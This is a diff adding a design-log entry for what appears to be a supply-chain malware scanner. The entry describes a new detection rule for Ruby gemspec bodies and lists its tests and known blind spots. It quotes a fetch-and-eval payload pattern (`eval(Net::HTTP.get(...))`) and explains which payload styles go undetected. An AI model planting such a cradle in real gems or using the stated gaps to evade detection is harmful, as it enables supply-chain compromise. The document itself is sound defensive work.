@@ -6220,3 +6220,56 @@ nothing here widens what is fetched, only when. The same default-on principle ap
 been swept across every other opt-in in the tool — `-epss` remains opt-in, defensibly (it is an enrichment
 ranking, not coverage, and needs a second external service) — but that sweep is now the recorded yardstick
 if the owner wants it.
+
+## D-150 — a gemspec's own body is executed code, and now analyzed as such
+
+**Trigger:** the outstanding list carried "RubyGems gemspec content-gate (needs a narrower marker than
+`scanCaps` for gemspec shell-outs)" since D-135. This closes it.
+
+**The gap, reproduced before building anything.** A `.gemspec` is not data — it is Ruby that `gem build` and
+`gem install` EVALUATE. `AnalyzeRuby` looked at gemspec content only when the gemspec declared a native
+extension (`extensions` and `extconf` both present as substrings), and ran `scanCaps` on it then. So a
+payload sitting directly in the gemspec body — `eval(Net::HTTP.get(URI('…')))` with no extension declared —
+produced zero hooks, while `scanCaps` on that same text correctly returned `[network exec]`. The signal was
+computed and thrown away because the wrong precondition guarded it.
+
+**Why the gate could not simply be "any capability", which is the whole reason this sat open.** A gemspec
+near-universally populates `s.files` with `` `git ls-files`.split ``, a backtick shell-out that trips
+`CapExec` on essentially every real gem in existence. Running `scanCaps` over every gemspec and firing on a
+non-empty result would flag the entire ecosystem — the false-positive tax that gets a detector switched off.
+`scanCaps(benign git ls-files gemspec)` is exactly `[exec]`, confirmed in the reproduction.
+
+**The resolution is the split VC-002e/f already draw for other executed hooks: exec is table stakes, a risk
+capability is the tell.** A new `gemspec:body` hook fires when a gemspec WITHOUT an extension declaration
+exhibits `CapNetwork`, `CapObfuscation`, `CapCradle`, or `CapCredentials` — never on `CapExec` alone.
+`gemspecBodyPayload` is that gate, and it is the load-bearing piece: the mutation widening it to
+`len(caps) > 0` fails the benign `git ls-files` boundary and the broader exec-only cases, which is the
+guarantee that this does not reintroduce the false-positive flood the narrow gate existed to avoid.
+
+**The extensions path is unchanged and kept distinct.** A gemspec that DOES declare a native extension keeps
+the D-135 behaviour — any capability, `CapExec` included, because the extconf.rb it points at will run — and
+still fires as `gemspec:extensions`, not `gemspec:body`. The two are mutually exclusive: an
+extensions-declaring gemspec with a body payload fires the extensions hook only, since the declaration is
+the more specific precondition and owns the finding. Tests pin both the correct-name and the no-double-fire
+properties, and the mutation collapsing extensions into the body gate fails both.
+
+**Proven end to end.** Through the rubygems adapter, a Gemfile.lock gem shipping a gemspec with
+`` `git ls-files` `` plus `eval(Net::HTTP.get(…))` now produces a **VC-002b finding — "install hook
+(gemspec:body) reaches the network"** — a detection that yielded nothing at all before this entry. IOCs in
+all fixtures are inert (RFC 5737 TEST-NET-3 `203.0.113.x` / `.invalid`).
+
+**Mutation-proven, four sites:** removing the body gate fails the payload tests; widening it to any
+capability fails the benign-baseline tests; dropping `CapNetwork` from the risk set fails the fetch-eval
+test; routing extensions through the body gate fails the name and double-fire tests.
+
+**Validation:** `gofmt`, `go build`, `go vet` clean; full suite green (34 packages); `-race` clean on
+`internal/installsurface` and `internal/ecosystem/rubygems`.
+
+Residual limitations: the gate keys on the capabilities `scanCaps` already recognizes, so a gemspec payload
+using a Ruby network/exec idiom `scanCaps` does not yet model is missed here exactly as it would be in an
+extconf.rb — this widens WHERE the existing capability scan runs, not what it recognizes. A gemspec that both
+declares an extension AND carries an unrelated body payload reports the extension hook only; the body payload
+rides along in the same scanned text so its capabilities still surface, but the hook is named for the
+extension. Exec-only remains deliberately silent, which is correct for `git ls-files` but would also miss a
+gemspec that shells out to a genuinely hostile local command with no network/obfuscation tell — the same
+exec-is-ordinary tradeoff every build-script analysis in the tool makes.
